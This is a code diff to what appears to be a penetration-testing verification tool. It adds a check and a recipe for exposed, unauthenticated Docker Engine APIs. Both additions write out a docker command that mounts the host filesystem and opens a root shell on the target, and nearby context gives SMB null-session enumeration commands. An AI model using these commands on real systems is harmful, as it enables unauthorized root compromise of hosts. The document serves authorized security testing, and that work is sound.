@@ -184,6 +184,20 @@ def _v_nullsession(host, port, vuln):
                     "If it lists shares/users without creds, it's real; access denied = FP."]
 
 
+def _v_docker_api(host, port, vuln):
+    # recce read the Docker API unauthenticated -> the exposure (and thus the root
+    # container-escape path) is directly observed. CONFIRMED.
+    return CONFIRMED, [
+        "recce read the Docker Engine API (/version + /info) with no credential - the "
+        "daemon is exposed unauthenticated (directly observed).",
+        "The daemon runs as root, so this is remote root RCE on the host: "
+        "docker -H <scheme>://<ip>:<port> run --rm -v /:/host -it alpine chroot /host sh "
+        "gives an interactive root shell on the host (run within ROE). recce does not "
+        "create a container itself - the successful unauthenticated read is the proof.",
+        "FP only if the port actually enforces mutual-TLS (2376 --tlsverify) and the "
+        "read was rejected - in which case recce would not have raised this."]
+
+
 def _v_ftp_backdoor(host, port, vuln):
     # A banner-matched trojaned/backdoored FTP build. The banner is strong evidence
     # but backdoor presence is only truly proven by triggering it, so LIKELY with the
@@ -500,6 +514,15 @@ _RECIPES: list[dict] = [
      "finish": "nxc smb <ip> -u '' -p '' --shares  (or enum4linux-ng -A <ip>).",
      "fp": "Access denied without credentials -> FP.",
      "fn": _v_nullsession},
+    {"id": "docker-api",
+     "match": r"docker engine api|docker api.*(exposed|unauth)|exposed.*docker|"
+              r"docker.*without authentication|docker container/image inventory",
+     "name": "Exposed Docker Engine API (unauthenticated root RCE)",
+     "pre": ["Docker API (2375/2376) reachable", "No authentication / mutual-TLS enforced"],
+     "finish": "docker -H <scheme>://<ip>:<port> run --rm -v /:/host -it alpine chroot "
+               "/host sh  (root shell on the host - ROE); recce only READ the API to prove it.",
+     "fp": "The port enforces mutual-TLS (2376 --tlsverify) and rejected the read.",
+     "fn": _v_docker_api},
     {"id": "ftp-backdoor",
      "match": r"vsftpd 2\.3\.4|proftpd.*backdoor|ftp.*backdoor|mod_copy|cve-2015-3306",
      "name": "Backdoored / RCE FTP build",
